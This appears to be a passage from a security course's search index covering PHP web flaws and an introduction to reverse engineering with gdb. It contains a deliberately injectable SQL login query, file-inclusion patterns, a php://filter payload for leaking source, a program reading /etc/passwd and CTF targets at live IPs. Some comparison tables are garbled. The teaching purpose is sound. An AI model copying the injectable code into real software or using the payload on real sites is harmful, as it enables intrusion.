'$email' AND password = '$password'\");\n        if ($row = $res-&gt;fetch_assoc()) {\n            $_SESSION['id'] = $row['id'];\n            header('Location: index.php');\n            die();\n        }\n   }\n?&gt;\n&lt;html&gt;...\n</code></pre> <p>This example PHP simply checks the POST data for an email and password. If the password is equal to the hashed password in the database, the use is logged in and redirected to the index page.</p> <p>The line <code>email = '$email'</code> uses automatic string interpolation in order to convert $email into a string to compare with the database.</p>"},{"location":"CS315/2021/Week%205/#type-juggling","title":"Type Juggling","text":"<p>PHP will do just about anything to match with a loose comparison (==) which means things can be 'equal' (==) or really equal (===). The implicit integer parsing to strings is the root cause of a lot of issues in PHP.</p>"},{"location":"CS315/2021/Week%205/#type-comparison-table","title":"Type Comparison Table","text":""},{"location":"CS315/2021/Week%205/#comparisons-of-x-with-php-functions","title":"Comparisons of $x with PHP Functions","text":"Expression gettype() empty() is_null() isset() boolean: <code>if($x)</code> $x = \"\"; string TRUE FALSE TRUE FALSE $x = null; NULL TRUE TRUE FALSE FALSE var $x; NULL TRUE TRUE FALSE FALSE $x is undefined NULL TRUE TRUE FALSE FALSE $x = array(); array TRUE FALSE TRUE FALSE $x = array('a', 'b'); array FALSE FALSE TRUE TRUE $x = false; boolean TRUE FALSE TRUE FALSE $x = true; boolean FALSE FALSE TRUE TRUE $x = 1; integer FALSE FALSE TRUE TRUE $x = 42; integer FALSE FALSE TRUE TRUE $x = 0; integer TRUE FALSE TRUE FALSE $x = -1; integer FALSE FALSE TRUE TRUE $x = \"1\"; string FALSE FALSE TRUE TRUE $x = \"0\"; string TRUE FALSE TRUE FALSE $x = \"-1\"; string FALSE FALSE TRUE TRUE $x = \"php\"; string FALSE FALSE TRUE TRUE $x = \"true\"; string FALSE FALSE TRUE TRUE $x = \"false\"; string FALSE FALSE TRUE TRUE"},{"location":"CS315/2021/Week%205/#comparisons","title":"\"==\" Comparisons","text":"TRUE FALSE 1 0 -1 \"1\" \"0\" \"-1\" NULL array() \"phparray() FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE TRUE FALSE FALSE \"php\" TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE \"\" FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE FALSE FALSE TRUE"},{"location":"CS315/2021/Week%205/#comparisons_1","title":"\"===\" Comparisons","text":"TRUE FALSE 1 0 -1 \"1\" \"0\" \"-1\" NULL array() \"php\" \"\" TRUE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 1 FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE -1 FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE \"1\" FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE \"0\" FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE \"-1\" FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE array() FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE \"php\" FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE \"\" FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE"},{"location":"CS315/2021/Week%205/#file-inclusion","title":"File Inclusion","text":"<p>PHP has multiple ways to include other source files such as require, require_once and include. These can take a dynamic string such as <code>require $_GET['page'] . \".php\";</code> which is usually seen in templating.</p>"},{"location":"CS315/2021/Week%205/#php-stream-filters","title":"PHP Stream Filters","text":"<p>PHP has its own URL scheme: <code>php://...</code> and its main purpose is to filter output automatically. It can automatically remove certain HTML tags and can base64 encode as well.</p>"},{"location":"CS315/2021/Week%205/#example_1","title":"Example","text":"<pre><code>$fp = fopen('php://output', 'w');\nstream_filter_append(\n       $fp,\n       'string.strip_tags',\n       STREAM_FILTER_WRITE,\n       array('b','i','u'));\nfwrite($fp, \"&lt;b&gt;bolded text&lt;/b&gt; enlarged to a &lt;h1&gt;level 1 heading&lt;/h1&gt;\\n\");\n/* &lt;b&gt;bolded text&lt;/b&gt; enlarged to a level 1 heading */\n</code></pre>"},{"location":"CS315/2021/Week%205/#exploitation","title":"Exploitation","text":"<p>These filters can also be used on input such as:</p> <ul> <li><code>php://filter/convert.base64-encode/resource={file}</code></li> <li><code>include</code>, <code>file_get_contents()</code>, etc. support URLs including PHP stream filter URLs (<code>php://</code>)</li> <li><code>include</code> normally evaluates any PHP code (in tags) it finds, but if it\u2019s base64 encoded it can be used to leak source</li> </ul>"},{"location":"CS315/2021/Week%205/#owasp-top-10","title":"OWASP Top 10","text":"<p>There are three new categories, four categories with naming and scoping changes, and some consolidation in the Top 10 for 2021.</p> <p></p> <ul> <li>A01:2021-Broken Access Control moves up from the fifth position; 94% of applications were tested for some form of broken access control. The 34 Common Weakness Enumerations (CWEs) mapped to Broken Access Control had more occurrences in applications than any other category.</li> <li>A02:2021-Cryptographic Failures shifts up one position to #2, previously known as Sensitive Data Exposure, which was broad symptom rather than a root cause. The renewed focus here is on failures related to cryptography which often leads to sensitive data exposure or system compromise.</li> <li>A03:2021-Injection slides down to the third position. 94% of the applications were tested for some form of injection, and the 33 CWEs mapped into this category have the second most occurrences in applications. Cross-site Scripting is now part of this category in this edition.</li> <li>A04:2021-Insecure Design is a new category for 2021, with a focus on risks related to design flaws. If we genuinely want to \u201cmove left\u201d as an industry, it calls for more use of threat modeling, secure design patterns and principles, and reference architectures.</li> <li>A05:2021-Security Misconfiguration moves up from #6 in the previous edition; 90% of applications were tested for some form of misconfiguration. With more shifts into highly configurable software, it\u2019s not surprising to see this category move up. The former category for XML External Entities (XXE) is now part of this category.</li> <li>A06:2021-Vulnerable and Outdated Components was previously titled Using Components with Known Vulnerabilities and is #2 in the Top 10 community survey, but also had enough data to make the Top 10 via data analysis. This category moves up from #9 in 2017 and is a known issue that we struggle to test and assess risk. It is the only category not to have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploit and impact weights of 5.0 are factored into their scores.</li> <li>A07:2021-Identification and Authentication Failures was previously Broken Authentication and is sliding down from the second position, and now includes CWEs that are more related to identification failures. This category is still an integral part of the Top 10, but the increased availability of standardized frameworks seems to be helping.</li> <li>A08:2021-Software and Data Integrity Failures is a new category for 2021, focusing on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. One of the highest weighted impacts from Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) data mapped to the 10 CWEs in this category. Insecure Deserialization from 2017 is now a part of this larger category.</li> <li>A09:2021-Security Logging and Monitoring Failures was previously Insufficient Logging &amp; Monitoring and is added from the industry survey (#3), moving up from #10 previously. This category is expanded to include more types of failures, is challenging to test for, and isn\u2019t well represented in the CVE/CVSS data. However, failures in this category can directly impact visibility, incident alerting, and forensics.</li> <li>A10:2021-Server-Side Request Forgery is added from the Top 10 community survey (#1). The data shows a relatively low incidence rate with above average testing coverage, along with above-average ratings for Exploit and Impact potential. This category represents the scenario where the security community members are telling us this is important, even though it\u2019s not illustrated in the data at this time.</li> </ul>"},{"location":"CS315/2021/Week%205/#exercise","title":"Exercise","text":""},{"location":"CS315/2021/Week%205/#5-pt-jiaran","title":"(5 pt) Jiaran!!!","text":"<p>One of my friends loves Jiaran so, so much. I'm not so interested in Vtubers, but I do know vtubers would hide some <code>flag</code> in web.</p> <p></p> <p>Now we have the chat page of fans: <code>http://103.102.44.218:10003/</code>. Maybe you can find flag in this website.</p> <p>Hint: as a fan web, the privilege check is broken.</p> <p>source.zip</p>"},{"location":"CS315/2021/Week%205/#5-pt-do-you-like-pickle","title":"(5 pt) Do you like pickle?","text":"<p>Rick is a famous scientist in our universe. One time he trapped himself into a pickle.</p> <p>Find some items to save Rick.</p> <p><code>http://103.102.44.218:10004/</code></p> <p>If you want to find some hints from source, here it is: source.zip</p>"},{"location":"CS315/2021/Week%205/#bonus-5-pt-jason-is-a-cool-guy","title":"(BONUS 5 pt) Jason is a cool guy","text":"<p>Seems this website is impossible to broken. But still, nothing can block you hackers from stealing the flag.</p> <p><code>https://81.68.223.245/</code></p> <p>Here's the source code for you: source.zip</p>"},{"location":"CS315/2021/Week%206/","title":"Week6 RE: De-compiling Program","text":"<p>According to the @CTF101: https://ctf101.org/</p>"},{"location":"CS315/2021/Week%206/#reverse-engineering","title":"Reverse Engineering","text":"<p>Reverse Engineering in a CTF is typically the process of taking a compiled (machine code, bytecode) program and converting it back into a more human readable format.</p> <p>Very often the goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues.</p> <ul> <li>Assembly / Machine Code</li> <li>The C Programming Language</li> <li>Disassemblers</li> <li>Decompilers</li> </ul>"},{"location":"CS315/2021/Week%206/#assemblymachine-code","title":"Assembly/Machine Code","text":"<p>Machine Code or Assembly is code which has been formatted for direct execution by a CPU. Machine Code is the why readable programming languages like C, when compiled, cannot be reversed into source code (well Decompilers can sort of, but more on that later).</p>"},{"location":"CS315/2021/Week%206/#from-source-to-compilation","title":"From Source to Compilation","text":"<p>Godbolt shows the differences in machine code generated by various compilers.</p> <p>For example, if we have a simple C++ function:</p> <pre><code>#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    char c;\n    int fd = syscall(2, \"/etc/passwd\", 0);\n    while (syscall(0, fd, &amp;c, 1)) {\n        putchar(c);\n    }\n}\n</code></pre> <p>We can see the compilation results in some verbose instrucitons for the CPU:</p> <pre><code>.LC0:\n  .string \"/etc/passwd\"\nmain:\n  push rbp\n  mov rbp, rsp\n  sub rsp, 16\n  mov edx, 0\n  mov esi, OFFSET FLAT:.LC0\n  mov edi, 2\n  mov eax, 0\n  call syscall\n  mov DWORD PTR [rbp-4], eax\n.L3:\n  lea rdx, [rbp-5]\n  mov eax, DWORD PTR [rbp-4]\n  mov ecx, 1\n  mov esi, eax\n  mov edi, 0\n  mov eax, 0\n  call syscall\n  test rax, rax\n  setne al\n  test al, al\n  je .L2\n  movzx eax, BYTE PTR [rbp-5]\n  movsx eax, al\n  mov edi, eax\n  call putchar\n  jmp .L3\n.L2:\n  mov eax, 0\n  leave\n  ret\n</code></pre> <p>This is a one way process for compiled languages as there is no way to generate source from machine code. While the machine code may seem unintelligble, the extremely basic functions can be interpreted with some practice.</p>"},{"location":"CS315/2021/Week%206/#x86-64","title":"x86-64","text":"<p>x86-64 or amd64 or i64 is a 64-bit Complex Instruction Set Computing (CISC) architecture. This basically means that the registers used for this architecture extend an extra 32-bits on Intel's x86 architecture. CISC means that a single instruction can do a bunch of diferent things at once such as memory accesses, register reads, etc. It is also a variable-length instruction set which means diferent instructions can be diferent sizes ranging from 1 to 16 bytes long. And finally x86-64 allows for multi-sized register access which means that you can access certain parts of a register which are diferent sizes.</p>"},{"location":"CS315/2021/Week%206/#x86-64-registers","title":"x86-64 Registers","text":"<p>x86-64 registers behave similarly to other architectures. A key component of x86-64 registers is multi-sized access which means the register RAX can have its lower 32 bits accessed with EAX. The next lower 16 bits can be accessed with AX and the lowest 8 bits can be accessed with AL which allows for the compuler to make optimizations which boost program execution. </p> <p>x86-64 has plenty of registers to use including rax, rbx, rcx, rdx, rdi, rsi, rsp, rip, r8-r15, and more! But some registers serve special purposes.</p> <p>The special registers include: - RIP: the instruction pointer - RSP: the stack pointer - RBP: the base pointer</p>"},{"location":"CS315/2021/Week%206/#instructions","title":"Instructions","text":"<p>An instruction represents a single operation for the CPU to perform.</p> <p>There are diferent types of instructions including:</p> <ul> <li>Data movement: <code>mov rax, [rsp - 0x40]</code></li> <li>Arithmetic: <code>add rbx, rcx</code></li> <li>Control-flow: <code>jne 0x8000400</code></li> </ul> <p>Because x86-64 is a CISC architecture, instructions can be quite complex for machine code such as <code>repne scasb</code> which repeats up to ECX times over memory at EDI looking for NULL byte (0x00), decrementing ECX each byte (Essentially strlen() in a single instruction!)</p> <p>It is important to remember that an instruction really is just memory, this idea will become useful with Return Oriented Programming or ROP.</p> <p>Note</p> <p>Instructions, numbers, strings, everything! Always represented in hex.</p> <pre><code>add rax, rbx\nmov rax, 0xdeadbeef\nmov rax, [0xdeadbeef] == 67 48 8b 05 ef be ad de\n\"Hello\" == 48 65 6c 6c 6f\n== 48 01 d8\n== 48 c7 c0 ef be ad de\n</code></pre>"},{"location":"CS315/2021/Week%206/#execution","title":"Execution","text":"<p>What should the CPU execute? This is determined by the RIP register where IP means instruction pointer. Execution follows the pattern: fetch the instruction at the address in RIP, decode it, run it.</p>"},{"location":"CS315/2021/Week%206/#examples","title":"Examples","text":"<p><code>mov rax, 0xdeadbeef</code></p> <p>Here the operation <code>mov</code> is moving the \"immeadiate\" <code>0xdeadbeef</code> into the register <code>RAX</code></p> <p><code>mov rax, [0xdeadbeef + rbx * 4]</code></p> <p>Here the operation <code>mov</code> is moving the data at the address of <code>[0xdeadbeef + RBX*4]</code> into the register <code>RAX</code>. When brackets are used, you can think of the program as getting the content from that effective address.</p>"},{"location":"CS315/2021/Week%206/#example-execution","title":"Example Execution","text":"<pre><code>-&gt; 0x0804000: mov eax, 0xdeadbeef            Register Values:\n   0x0804005: mov ebx, 0x1234                RIP = 0x0804000\n   0x080400a: add, rax, rbx                  RAX = 0x0\n   0x080400d: inc rbx                        RBX = 0x0\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n   0x0804000: mov eax, 0xdeadbeef            Register Values:\n-&gt; 0x0804005: mov ebx, 0x1234                RIP = 0x0804005\n   0x080400a: add, rax, rbx                  RAX = 0xdeadbeef\n   0x080400d: inc rbx                        RBX = 0x0\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n   0x0804000: mov eax, 0xdeadbeef            Register Values:\n   0x0804005: mov ebx, 0x1234                RIP = 0x080400a\n-&gt; 0x080400a: add, rax, rbx                  RAX = 0xdeadbeef\n   0x080400d: inc rbx                        RBX = 0x1234\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n   0x0804000: mov eax, 0xdeadbeef            Register Values:\n   0x0804005: mov ebx, 0x1234                RIP = 0x080400d\n   0x080400a: add, rax, rbx                  RAX = 0xdeadd123\n-&gt; 0x080400d: inc rbx                        RBX = 0x1234\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n   0x0804000: mov eax, 0xdeadbeef            Register Values:\n   0x0804005: mov ebx, 0x1234                RIP = 0x0804010\n   0x080400a: add, rax, rbx                  RAX = 0xdeadd123\n   0x080400d: inc rbx                        RBX = 0x1235\n-&gt; 0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n   0x0804000: mov eax, 0xdeadbeef            Register Values:\n   0x0804005: mov ebx, 0x1234                RIP = 0x0804013\n   0x080400a: add, rax, rbx                  RAX = 0xdeadbeee\n   0x080400d: inc rbx                        RBX = 0x1235\n   0x0804010: sub rax, rbx                   RCX = 0x0\n-&gt; 0x0804013: mov rcx, rax                   RDX = 0x0\n   0x0804000: mov eax, 0xdeadbeef            Register Values:\n   0x0804005: mov ebx, 0x1234                RIP = 0x0804005\n   0x080400a: add, rax, rbx                  RAX = 0xdeadbeee\n   0x080400d: inc rbx                        RBX = 0x1235\n   0x0804010: sub rax, rbx                   RCX = 0xdeadbeee\n   0x0804013: mov rcx, rax                   RDX = 0x0\n</code></pre>"},{"location":"CS315/2021/Week%206/#control-flow","title":"Control Flow","text":"<p>How can we express conditionals in x86-64? We use conditional jumps such as:</p> <ul> <li><code>jnz &lt;address&gt;</code></li> <li><code>je &lt;address&gt;</code></li> <li><code>jge &lt;address&gt;</code></li> <li><code>jle &lt;address&gt;</code></li> <li>etc.</li> </ul> <p>They jump if their condition is true, and just go to the next instruction otherwise. These conditionals are checking EFLAGS which are special registers which store flags on certain instructions such as <code>add rax, rbx</code> which sets the o (overflow) flag if the sum is greater than a 64-bit register can hold, and wraps around. You can jump based on that with a <code>jo</code> instruction. The most important thing to remember is the cmp instruction:</p> <pre><code>cmp rax, rbx\njle error\n</code></pre> <p>This assembly jumps if RAX &lt;= RBX</p>"},{"location":"CS315/2021/Week%206/#addresses","title":"Addresses","text":"<p>Memory acts similarly to a big array where the indices of this \"array\" are memory addresses. Remember from earlier:</p> <pre><code>mov rax, [0xdeadbeef]\n</code></pre> <p>The square brackets mean \"get the data at this address\". This is analagous to the C/C++ syntax: <code>rax = *0xdeadbeef;</code></p>"},{"location":"CS315/2021/Week%206/#the-c-programming-language","title":"The C Programming Language","text":""},{"location":"CS315/2021/Week%206/#history","title":"History","text":"<p>The C programming language iwas written by Dennis Ritchie in the 1970s while he was working at Bell Labs. It was first used to reimplement the Unix operating system which was purely written in assembly language. At first, the Unix developers were considering using a language called \"B\" but because B wasn't optimized for the target computer, the C language was created.</p> <p>C is the letter and the programming language after B!</p> <p>C was designed to be close to assembly and is still widely used in lower level programming where speed and control are needed (operating systems, embedded systems). C was also very influential to other programming langauges used today. Notable languages include C++, Objective-C, Golang, Java, JavaScript, PHP, Python, and Rust.</p>"},{"location":"CS315/2021/Week%206/#hello-world","title":"Hello World","text":"<p>C is an ancestor of many other programming languages and if you are familiar with programming, it's likely that C will be at least someewhat familiar.</p> <pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n   printf(\"Hello, World!\");\n   return 0;\n}\n</code></pre>"},{"location":"CS315/2021/Week%206/#today","title":"Today","text":"<p>Today C is widely used either as a low level programming langauge or is the base language that other programming languages are implemented in.</p> <p>While it can be difficult to see, the C language compiles down directly into machine code. The compiler is programmed to process the provided C code and emit assembly that's targetted to whatever operating system and architecture the compiler is set to use.</p> <p>Some common compilers include:</p> <ul> <li>gcc</li> <li>clang</li> </ul> <p>A good way to explore this relationship is to use this online GCC Explorer from Matt Godbolt.</p> <p></p> <p>In regards to CTF, many reverse engineering and exploitation CTF challenges are written in C because the language compiles down directly to assembly and there are little to no safeguards in the language. This means developers must manually handle both. Of course, this can lead to mistakes which can sometimes lead to security issues.</p> <p>Other higher level langauges like Python manage memory and garbage collection for you. Google Golang was inspired by C but adds in functionality like garbage collection, and memory safety.</p> <p>There are some examples of famously vulnerable functions in C which are still available and can still result in vulnerabilities:</p> <ul> <li><code>gets</code> - Can result in buffer overflows</li> <li><code>strcpy</code> - Can result in buffer overflows</li> <li><code>strcat</code> - Can result in buffer overflows</li> <li><code>strcmp</code> - Can result in timing attacks</li> </ul>"},{"location":"CS315/2021/Week%206/#types","title":"Types","text":"<p>C has four basic types:</p> <ul> <li>char - characters</li> <li>int - integers (e.g. 125)</li> <li>float - 32 bit floating point number (e.g. 2.4)</li> <li>double - 64 bit floating point number (like a float but more precise in terms of decimal points)</li> </ul>"},{"location":"CS315/2021/Week%206/#pointers","title":"Pointers","text":"<p>C uses an idea known as pointers. A pointer is a variable which contains the address of another variable.</p> <p>To understand this idea we should first understand that memory is laid out in terms of addresses and data gets stored at these addresses.</p> <p>Take the following example of defining an integer in C:</p> <pre><code>int x = 4;\n</code></pre> <p>To the programmer this is the variable <code>x</code> receiving the value of 4. The computer stores this value in some location in memory. For example we can say that address <code>0x1000</code> now holds the value <code>4</code>. The computer knows to directly access the memory and retrieve the value <code>4</code> whenever the programmer tries to use the <code>x</code> variable. If we were to say <code>x + 4</code>, the computer would give you <code>8</code> instead of <code>0x1004</code>.</p> <p>But in C we can retrieve the memory address being used to hold the 4 value (i.e. 0x1000) by using the <code>&amp;</code> character and using <code>*</code> to create an \"integer pointer\" type.</p> <pre><code>int* y = &amp;x;\n</code></pre> <p>The <code>y</code> variable will store the address pointed to by the <code>x</code>variable (0x1000).</p> <p>The <code>*</code> character allows us to declare pointer variables but also allows us to access the value stored at a pointer. For example, entering <code>*y</code> allows us to access the 4 value instead of 0x1000.</p> <p>Whenever we use the <code>y</code> variable we are using the memory address, but if we use the x variable we use the value stored at the memory address.</p>"},{"location":"CS315/2021/Week%206/#arrays","title":"Arrays","text":"<p>Arrays are a grouping of objects of the same type. They are typically created with the following syntax:</p> <pre><code>type arrayName [ arraySize ];\n</code></pre> <p>To initialize values in the array we can do:</p> <pre><code>int integers[ 10 ] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n</code></pre> <p>Arrays allow programmers to group data into logical containers.</p> <p>To access the indiviual elements of an array we access the contents by their \"index\". Most programming langauges today start counting from 0. So to take our previous example:</p> <pre><code>int integers[ 10 ] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n/*     indexes        0  1  2  3  4  5  6  7  8   9\n</code></pre> <p>To access the value 6 we would use index 5:</p> <pre><code>integers[5];\n</code></pre>"},{"location":"CS315/2021/Week%206/#how-do-arrays-work","title":"How do arrays work?","text":"<p>Arrays are a clever combination of multiplication, pointers, and programming.</p> <p>Because the computer knows the data type used for every element in the array, the computer needs to simply multiply the size of the data type by the index you are looking for and then add this value to the address of the beginning of the array.</p> <p>For example if we know that the base address of an array is 1000 and we know that each integer takes 8 bytes, we know that if we have 8 integers right next to each other, we can get the integer at the 4th index with the following math:</p> <pre><code>1000 + (4 * 8) =  1032\narray [ 1   , 2   , 3   , 4   , 5   , 6   , 7   , 8   ]\nindex   0     1     2     3     4     5     6     7\naddrs  1000  1008  1016  1024  1032  1040  1048  1056\n</code></pre>"},{"location":"CS315/2021/Week%206/#disassemblers","title":"Disassemblers","text":"<p>A disassembler is a tool which breaks down a compiled program into machine code.</p>"},{"location":"CS315/2021/Week%206/#list-of-disassemblers","title":"List of Disassemblers","text":"<ul> <li>IDA</li> <li>Binary Ninja</li> <li>GNU Debugger (GDB)</li> <li>radare2</li> <li>Hopper</li> </ul>"},{"location":"CS315/2021/Week%206/#ida","title":"IDA","text":"<p>The Interactive Disassembler (IDA) is the industry standard for binary disassembly. IDA is capable of disassembling \"virtually any popular file format\". This makes it very useful to security researchers and CTF players who often need to analyze obscure files without knowing what they are or where they came from. IDA also features the industry leading Hex Rays decompiler which can convert assembly code back into a pseudo code like format.</p> <p></p> <p>IDA also has a plugin interface which has been used to create some successful plugins that can make reverse engineering easier:</p> <ul> <li>https://github.com/google/binnavi</li> <li>https://github.com/yegord/snowman</li> <li>https://github.com/gaasedelen/lighthouse</li> <li>https://github.com/joxeankoret/diaphora</li> <li>https://github.com/REhints/HexRaysCodeXplorer</li> <li>https://github.com/osirislab/Fentanyl</li> </ul>"},{"location":"CS315/2021/Week%206/#binary-ninja","title":"Binary Ninja","text":"<p>Binary Ninja is an up and coming disassembler that attempts to bring a new, more programmatic approach to reverse engineering. Binary Ninja brings an improved plugin API and modern features to reverse engineering. While it's less popular or as old as IDA, Binary Ninja (often called binja) is quickly gaining ground and has a small community of dedicated users and followers.</p> <p></p> <p>Binja also has some community contributed plugins which are collected here: https://github.com/Vector35/community-plugins</p>"},{"location":"CS315/2021/Week%206/#gdb","title":"gdb","text":"<p>The GNU Debugger is a free and open source debugger which also disassembles programs. It's capable as a disassembler, but most notably it is used by CTF players for its debugging and dynamic analysis capabailities.</p> <p>gdb is often used in tandom with enhancement scripts like peda, pwndbg, and GEF</p> <p></p>"},{"location":"CS315/2021/Week%206/#the-gnu-debugger-gdb","title":"The GNU Debugger (GDB)","text":"<p>The GNU Debugger or GDB is a powerful debugger which allows for step-by-step execution of a program. It can be used to trace program execution and is an important part of any reverse engineering toolkit.</p>"},{"location":"CS315/2021/Week%206/#vanilla-gdb","title":"Vanilla GDB","text":"<p>GDB without any modifications is unintuitive and obscures a lot of useful information. The plug-in pwndb solves a lot of these problems and makes for a much more pleasant experience. But if you are constrained and have to use vanilla gdb, here are several things to make your life easier.</p>"},{"location":"CS315/2021/Week%206/#starting-gdb","title":"Starting GDB","text":"<p>To execute GBD and attach it to a program simply run <code>gdb [program]</code></p>"},{"location":"CS315/2021/Week%206/#disassembly","title":"Disassembly","text":"<p><code>(gdb) disassemble [address/symbol]</code> will display the disassembly for that function/frame</p> <p>GDB will autocomplete functions, so saying <code>(gdb) disas main</code> suffices if you'd like to see the disassembly of main</p>"},{"location":"CS315/2021/Week%206/#view-disassembly-during-execution","title":"View Disassembly During Execution","text":"<p>Another handy thing to see while stepping through a program is the disassembly of nearby instructions:</p> <pre><code>(gdb) display/[# of instructions]i $pc [\u00b1 offset]\n</code></pre> <ul> <li><code>display</code> shows data with each step</li> <li><code>/[#]i</code> shows how much data in the format i for instruction</li> <li><code>$pc</code> means the pc, program counter, register</li> <li><code>[\u00b1 offset]</code> allows you to specify how you would like the data offset from the current instruction</li> </ul>"},{"location":"CS315/2021/Week%206/#example-usage","title":"Example Usage","text":"<pre><code>(gdb) display/10i $pc - 0x5\n</code></pre> <p>This command will show 10 instructions on screen with an offset from the next instruction of 5, giving us this display:</p> <pre><code>   0x8048535 &lt;main+6&gt;:  lock pushl -0x4(%ecx)\n   0x8048539 &lt;main+10&gt;: push   %ebp\n=&gt; 0x804853a &lt;main+11&gt;: mov    %esp,%ebp\n   0x804853c &lt;main+13&gt;: push   %ecx\n   0x804853d &lt;main+14&gt;: sub    $0x14,%esp\n   0x8048540 &lt;main+17&gt;: sub    $0xc,%esp\n   0x8048543 &lt;main+20&gt;: push   $0x400\n   0x8048548 &lt;main+25&gt;: call   0x80483a0 &lt;malloc@plt&gt;\n   0x804854d &lt;main+30&gt;: add    $0x10,%esp\n   0x8048550 &lt;main+33&gt;: sub    $0xc,%esp\n</code></pre>"},{"location":"CS315/2021/Week%206/#deleting-views","title":"Deleting Views","text":"<p>If for whatever reason, a view no long suits your needs simply call <code>(gdb) info display</code> which will give you a list of active displays:</p> <pre><code>Auto-display expressions now in effect:\nNum Enb Expression\n1:   y  /10bi $pc-0x5\n</code></pre> <p>Then simply execute <code>(gdb) delete display 1</code> and your execution will resume without the display.</p>"},{"location":"CS315/2021/Week%206/#registers","title":"Registers","text":"<p>In order to view the state of registers with vanilla gdb, you need to run the command <code>info registers</code> which will display the state of all the registers:</p> <pre><code>eax            0xf77a6ddc   -142971428\necx            0xffe06b10   -2069744\nedx            0xffe06b34   -2069708\nebx            0x0  0\nesp            0xffe06af8   0xffe06af8\nebp            0x0  0x0\nesi            0xf77a5000   -142979072\nedi            0xf77a5000   -142979072\neip            0x804853a    0x804853a &lt;main+11&gt;\neflags         0x286    [ PF SF IF ]\ncs             0x23 35\nss             0x2b 43\nds             0x2b 43\nes             0x2b 43\nfs             0x0  0\ngs             0x63 99\n</code></pre> <p>If you simply would like to see the contents of a single register, the notation <code>x/x $[register]</code> where:</p> <ul> <li><code>x/x</code> means display the address in hex notation</li> <li><code>$[register]</code> is the register code such as eax, rax, etc.</li> </ul>"},{"location":"CS315/2021/Week%206/#pwndbg","title":"Pwndbg","text":"<p>These commands work with vanilla gdb as well.</p>"},{"location":"CS315/2021/Week%206/#setting-breakpoints","title":"Setting Breakpoints","text":"<p>Setting breakpoints in GDB uses the format <code>b*[Address/Symbol]</code></p>"},{"location":"CS315/2021/Week%206/#example-usage_1","title":"Example Usage","text":"<ul> <li><code>(gdb) b*main</code>: Break at the start</li> <li><code>(gdb) b*0x804854d</code>: Break at 0x804854d</li> <li><code>(gdb) b*0x804854d-0x100</code>: Break at 0x804844d</li> </ul>"},{"location":"CS315/2021/Week%206/#deleting-breakpoints","title":"Deleting Breakpoints","text":"<p>As before, in order to delete a view, you can list the available breakpoints using <code>(gdb) info breakpoints</code> (don't forget about GDB's autocomplete, you don't always need to type out every command!) which will display all breakpoints:</p> <pre><code>Num     Type           Disp Enb Address    What\n1       breakpoint     keep y   0x0804852f &lt;main&gt;\n3       breakpoint     keep y   0x0804864d &lt;__libc_csu_init+61&gt;\n</code></pre> <p>Then simply execute <code>(gdb) delete 1</code></p> <p>Note</p> <p>GDB creates breakpoints chronologically and does NOT reuse numbers.</p>"},{"location":"CS315/2021/Week%206/#stepping","title":"Stepping","text":"<p>What good is a debugger if you can't control where you are going? In order to begin execution of a program, use the command <code>r [arguments]</code> similar to how if you ran it with dot-slash notation you would execute it <code>./program [arguments]</code>. In this case the program will run normally and if no breakpoints are set, you will execute normally. If you have breakpoints set, you will stop at that instruction.</p> <ul> <li><code>(gdb) continue [# of breakpoints]</code>: Resumes the execution of the program until it finishes or until another breakpoint is hit (shorthand <code>c</code>)</li> <li><code>(gdb) step[# of instructions]</code>: Steps into an instruction the specified number of times, default is 1 (shorthand <code>s</code>)</li> <li><code>(gdb) next instruction [# of instructions]</code>: Steps over an instruction meaning it will not delve into called functions (shorthand <code>ni</code>)</li> <li><code>(gdb) finish</code>: Finishes a function and breaks after it gets returned (shorthand <code>fin</code>)</li> </ul>"},{"location":"CS315/2021/Week%206/#examining","title":"Examining","text":"<p>Examining data in GDB is also very useful for seeing how the program is affecting data. The notation may seem complex at first, but it is flexible and provides powerful functionality.</p> <pre><code>(gdb) x/[#][size][format] [Address/Symbol/Register][\u00b1 offset]\n</code></pre> <ul> <li><code>x/</code> means examine</li> <li><code>[#]</code> means how much</li> <li><code>[size]</code> means what size the data should be such as a word w (2 bytes), double word d (4 bytes), or giant word g (8 bytes)</li> <li><code>[format]</code> means how the data should be interpreted such as an instruction i, a string s, hex bytes x</li> <li><code>[Address/Symbol][\u00b1 offset]</code> means where to start interpreting the data</li> </ul>"},{"location":"CS315/2021/Week%206/#example-usage_2","title":"Example 